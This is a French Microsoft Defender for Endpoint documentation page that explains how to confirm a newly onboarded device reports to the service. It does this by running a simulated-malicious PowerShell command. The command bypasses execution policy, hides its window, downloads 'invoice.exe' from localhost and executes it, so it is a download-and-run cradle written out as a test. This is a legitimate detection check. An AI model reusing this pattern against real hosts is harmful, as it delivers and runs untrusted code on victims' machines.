---
title: Exécuter un test de détection sur un appareil Microsoft Defender pour point de terminaison nouvellement intégré
description: Exécutez le script de détection sur un appareil nouvellement intégré pour vérifier qu’il est correctement intégré au service Microsoft Defender for Endpoint.
keywords: test de détection, détection, powershell, script, vérifier, intégration, microsoft defender pour l’intégration de point de terminaison, clients, serveurs, test
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: 10090fdd1dff6b020d06c82afa8456d7a157ff91
ms.sourcegitcommit: 4fb1226d5875bf5b9b29252596855a6562cea9ae
ms.translationtype: MT
ms.contentlocale: fr-FR
ms.lasthandoff: 06/08/2021
ms.locfileid: "52843305"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a>Exécuter un test de détection sur un appareil Microsoft Defender pour point de terminaison nouvellement intégré 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


**S’applique à :**
- Versions Windows 10 pris en charge
- Windows Server 2012 R2
- Windows Server 2016
- Windows Serveur, version 1803
- Windows Server, 2019
- [Microsoft Defender pour point de terminaison](https://go.microsoft.com/fwlink/?linkid=2154037)
- [Microsoft 365 Defender](https://go.microsoft.com/fwlink/?linkid=2118804)

> Vous souhaitez découvrir Microsoft Defender pour le point de terminaison ? [Inscrivez-vous à un essai gratuit.](https://www.microsoft.com/microsoft-365/windows/microsoft-defender-atp?ocid=docs-wdatp-exposedapis-abovefoldlink)

Exécutez le script PowerShell suivant sur un appareil nouvellement intégré pour vérifier qu’il est correctement signalé au service Defender for Endpoint.

1. Créez un dossier : « C:\test-MDATP-test ».
2. Ouvrez une invite de ligne de commande avec élévation de niveaux sur l’appareil et exécutez le script :

   1. Accéder à **Démarrer** et taper **cmd**.

   1. Cliquez avec le bouton droit **sur Invite de** commandes et **sélectionnez Exécuter en tant qu’administrateur.**

      ![Menu Démarrer de la fenêtre pointant sur Exécuter en tant qu’administrateur](images/run-as-admin.png)

3. À l’invite, copiez et exécutez la commande suivante :

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

La fenêtre d’invite de commandes se ferme automatiquement. Si elle réussit, le test de détection est marqué comme terminé et une nouvelle alerte s’affiche dans le portail pour l’appareil intégré dans environ 10 minutes.

## <a name="related-topics"></a>Voir aussi
- [Intégrer des appareils Windows 10](configure-endpoints.md)
- [Serveurs intégrés](configure-server-endpoints.md)
- [Résoudre les problèmes d’intégration de Microsoft Defender pour les points de terminaison](/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
